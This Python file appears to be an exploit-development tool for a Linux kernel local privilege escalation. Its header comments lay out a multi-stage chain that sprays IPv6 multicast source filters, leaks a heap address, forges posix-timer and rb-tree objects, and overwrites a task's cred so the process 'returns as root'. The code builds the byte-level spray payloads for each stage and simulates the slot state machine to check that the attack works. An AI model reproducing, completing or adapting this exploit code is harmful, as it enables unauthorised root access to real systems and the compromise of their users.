# mcastrel3.py -- final model of the psl port (block O = node only, P_base =
# uniform lay11 object pattern in every other block).
#
# Chain (all offsets from the device BTF; node bytes are at X+0):
#
#   spray 14 identical sources per socket (msfilter does NOT check dupes), so
#   every block reads as zeros -> reap B's cleanup takes rb_erase case 1a,
#   RB_CLEAR_NODE stores X at X, the scan reads it back (the leak).
#
#   P_s1  q0=scratch  q1=0  q2=X+0x18  q3=1  q4=fake_head  q5=1
#         elist/firing/handling free, sigev=1, it_lock=1
#         -> collect: expires=1 (due), firing=1, dequeue with the FAKE head
#            (real base untouched), case 1b stores scratch into q3, head=NULL,
#            list_add_tail(elist); handle parks on it_lock with handling=winner.
#
#   P_rel1 q0=0 q1=0 q2=X-0x58 q3=0 q4=0 q5=0, elist=saved, firing=1,
#          handling=winner, sigev=1, it_lock=1
#         -> reap victim C: cleanup_timerqueue(C's base) -> timerqueue_del(X):
#            case 1b stores pc=0 at rb_left = X-0x58 (the it_lock -> release),
#            __rb_change_child(parent=0) roots C's dead base at X-0x58, and
#            rb_next(X) returns NULL (node.pc == 0), so the loop ends.
#
#   P_s2  q0=C(cred) q1=0 q2=winner+cred q3=0 q4=winner+tqhead q5=~0
#         it_lock=0 (the winner must NOT park: it returns as root immediately)
#         -> collect: dequeue against the REAL head, case 1b stores C into
#            winner->cred and C+8 = winner+cred (cred+0x08 is free in lay11),
#            rb_erase_cached sets leftmost = rb_next = C, iteration 2 reads
#            C+0x18 = cred egid|fsuid = huge and returns; handle runs with
#            lock 0, fires SIGEV_NONE, unlocks, winner returns as root.
#
# The only parked rewrite is P_s1 -> P_rel1.  ip6_mc_source deletes shift
# slots [j, count-2] left, so as long as we delete from the BACK down to
# index c_lock, and then from the FRONT, the physical slot c_lock is never a
# shift destination and keeps the attack's it_lock word (1) until the add
# phase writes the target lock chunk there ((c_lock+1)-th add).  The kernel's
# qspinlock may set the pending bit (0x100) meanwhile, which only changes that
# chunk's value; every op is issued off a fresh msfget read-back.
import sys
sys.path.insert(0, r'D:\kwork\icbuild\scratch')
import lay11 as L

WLO, WHI = 0x18, 0xf8
NC = 14
CLEAN_L = (0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8)


def chunk_of(r):
    return ((r - WLO) & 0xff) // 16


def off_in_chunk(r):
    return ((r - WLO) & 0xff) % 16


def put(mem, r, v):
    r &= 0xff
    if not (WLO <= r < WHI):
        raise ValueError('residue %#x outside window' % r)
    if r in mem and mem[r] != v:
        raise ValueError('conflict at %#x (have %#x want %#x)'
                         % (r, mem[r], v))
    mem[r] = v


def putq(mem, r, v):
    for i in range(8):
        put(mem, r + i, (v >> (8 * i)) & 0xff)


def chunks_of(mem):
    return [bytes(mem.get(WLO + 16 * k + i, 0) for i in range(16))
            for k in range(NC)]


def fill(mem):
    """Paint every free residue with a non-zero, chunk-unique filler."""
    mem = dict(mem)
    for k in range(NC):
        for i in range(16):
            r = WLO + 16 * k + i
            if r not in mem:
                mem[r] = (0x40 + k + i) & 0xff or 1
    ch = chunks_of(mem)
    if len(set(ch)) != NC:
        raise ValueError('chunks not distinct after fill')
    return mem


def build(stage, base, oi, Lv, rt):
    """rt: dict of runtime values (scratch, head, C, winner, elist_*)."""
    X = base + 0x100 * oi + Lv
    mem = {}
    if stage == 's1':
        putq(mem, Lv + 0x00, rt['scratch'])
        putq(mem, Lv + 0x08, 0)
        putq(mem, Lv + 0x10, X + 0x18)
        putq(mem, Lv + 0x18, 1)          # expires: due, but non-zero
        putq(mem, Lv + 0x20, rt['head'])
        putq(mem, Lv + 0x28, 1)          # pid: unused here, keep non-zero
        putq(mem, Lv + 0x30, 1)          # elist: list_add_tail overwrites
        putq(mem, Lv + 0x38, 1)
        put(mem, Lv + 0x40, 1)           # firing: collect sets 1 anyway
        for i in range(1, 4):
            put(mem, Lv + 0x40 + i, 0)
        putq(mem, Lv + 0x48, 0)          # handling: kernel overwrites
        put(mem, Lv - 0x24, 1)           # sigev = SIGEV_NONE
        put(mem, Lv - 0x58, 1)           # it_lock: _Q_LOCKED_VAL
        for i in range(1, 4):
            put(mem, Lv - 0x24 + i, 0)
            put(mem, Lv - 0x58 + i, 0)   # tail bytes must stay 0
    elif stage == 'rel':
        putq(mem, Lv + 0x00, 0)          # pc = 0 -> rb_next terminates
        putq(mem, Lv + 0x08, 0)
        putq(mem, Lv + 0x10, X - 0x58)   # rb_left = the it_lock itself
        putq(mem, Lv + 0x18, 0)
        putq(mem, Lv + 0x20, 1)          # head: cleanup writes it, never reads
        putq(mem, Lv + 0x28, 1)          # pid: never read on this path
        putq(mem, Lv + 0x30, rt['el_next'])
        putq(mem, Lv + 0x38, rt['el_prev'])
        put(mem, Lv + 0x40, 1)
        for i in range(1, 4):
            put(mem, Lv + 0x40 + i, 0)
        putq(mem, Lv + 0x48, rt['winner'])
        put(mem, Lv - 0x24, 1)
        put(mem, Lv - 0x58, 1)
        for i in range(1, 4):
            put(mem, Lv - 0x24 + i, 0)
            put(mem, Lv - 0x58 + i, 0)
    elif stage == 's2':
        putq(mem, Lv + 0x00, rt['C'])
        putq(mem, Lv + 0x08, 0)
        putq(mem, Lv + 0x10, rt['wcred'])
        putq(mem, Lv + 0x18, 0)          # due
        putq(mem, Lv + 0x20, rt['whead'])
        putq(mem, Lv + 0x28, (1 << 64) - 1)
        putq(mem, Lv + 0x30, 1)          # list_add_tail overwrites
        putq(mem, Lv + 0x38, 1)
        put(mem, Lv + 0x40, 1)
        for i in range(1, 4):
            put(mem, Lv + 0x40 + i, 0)
        putq(mem, Lv + 0x48, 0)
        put(mem, Lv - 0x24, 1)
        for i in range(1, 4):
            put(mem, Lv - 0x24 + i, 0)
            put(mem, Lv - 0x58 + i, 0)   # NOT locked: the winner runs on
    else:
        raise ValueError(stage)
    return fill(mem)


def apply_kernel_writes(mem, Lv, writes):
    mem = dict(mem)
    for (r, v, n) in writes:
        for i in range(n):
            mem[(r + i) & 0xff] = (v >> (8 * i)) & 0xff
    return mem


class Sim:
    """Exact ip6_mc_source state machine on 14 physical 16-byte slots."""

    def __init__(self, chunks):
        self.a = [bytes(c) for c in chunks]
        self.count = NC

    def lockword(self, r0):
        v = 0
        for i in range(4):
            r = (r0 + i) & 0xff
            v |= self.a[chunk_of(r)][off_in_chunk(r)] << (8 * i)
        return v

    def delete_val(self, v):
        v = bytes(v)
        for j in range(self.count):
            if self.a[j] == v:
                for k in range(j + 1, self.count):
                    self.a[k - 1] = self.a[k]
                self.count -= 1
                return j
        raise RuntimeError('delete: value not found')

    def add(self, v):
        if self.count == NC:
            raise RuntimeError('realloc')
        for k in range(self.count):
            if self.a[k] == v:
                raise RuntimeError('duplicate add')
        self.a[self.count] = bytes(v)
        self.count += 1


def rewrite(src, dst, Lv, r0, parked):
    """Read back, delete back-to-front down to c_lock then front-to-back, add
    with the lock chunk at index c_lock.  Returns the max lock word == 0."""
    sim = Sim(src)
    c_lock = chunk_of(r0)
    worst = []
    while sim.count > c_lock:
        v = sim.a[sim.count - 1]
        j = sim.delete_val(v)          # kernel deletes the FIRST match
        if j != sim.count:             # (after decrement) must be the tail
            worst.append(('del-order', j, sim.count))
        if parked and sim.lockword(r0) == 0:
            worst.append(('del', sim.count))
    while sim.count > 0:
        v = sim.a[0]
        j = sim.delete_val(v)
        if j != 0:
            worst.append(('del0-order', j, sim.count))
        if parked and sim.lockword(r0) == 0:
            worst.append(('del0', sim.count))
    order = list(range(NC))
    order.remove(c_lock)
    order.insert(c_lock, c_lock)     # lock chunk added at its own index
    for k in order:
        sim.add(dst[k])
        if parked and sim.lockword(r0) == 0:
            worst.append(('add', sim.count))
    if sim.count != NC or [bytes(x) for x in sim.a] != [bytes(x) for x in dst]:
        raise RuntimeError('final state mismatch')
    return worst


def main():
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    bad = 0
    tot = 0
    for Lv in CLEAN_L:
        r0 = (Lv - 0x58) & 0xff
        for oi in range(32):
            tot += 1
            try:
                rt = dict(scratch=base + 0x100 * oi + 0xe0,
                          head=base + 0x100 * oi + 0xd0,
                          C=base + 0x100 * 3 + 0x20,
                          wcred=0xffffff8001234000 + 0x838,
                          whead=0xffffff8001234000 + 0x1000,
                          winner=0xffffff8001234000,
                          el_next=0xffffff8001234560,
                          el_prev=0xffffff8001234568)
                m1 = build('s1', base, oi, Lv, rt)
                mrel = build('rel', base, oi, Lv, rt)
                m2 = build('s2', base, oi, Lv, rt)
                c1 = chunks_of(m1)
                # stage-1 pattern: the chunk holding the lock must read 1
                if Sim(c1).lockword(r0) != 1:
                    raise ValueError('s1 lock word %#x' % Sim(c1).lockword(r0))
                # the kernel's writes between the s1 collect and the rewrite
                X = base + 0x100 * oi + Lv
                kw = [(Lv + 0x00, X, 8), (Lv + 0x18, rt['scratch'], 8),
                      (Lv + 0x20, 0, 8), (Lv + 0x30, rt['el_next'], 8),
                      (Lv + 0x38, rt['el_prev'], 8), (Lv + 0x40, 1, 4),
                      (Lv + 0x48, rt['winner'], 8)]
                m1k = apply_kernel_writes(m1, Lv, kw)
                w = rewrite(chunks_of(m1k), chunks_of(mrel), Lv, r0,
                            parked=True)
                # after the release the winner runs; the s2 install is free
                w2 = rewrite(chunks_of(mrel), chunks_of(m2), Lv, r0,
                             parked=False)
            except (ValueError, RuntimeError) as e:
                bad += 1
                print('L=%#04x O=%2d FAIL %s' % (Lv, oi, e))
                continue
            if w:
                bad += 1
                print('L=%#04x O=%2d park broken %s' % (Lv, oi, w[:3]))
    print('%d/%d ok' % (tot - bad, tot))
    return 0 if bad == 0 else 1


if __name__ == '__main__':
    raise SystemExit(main())
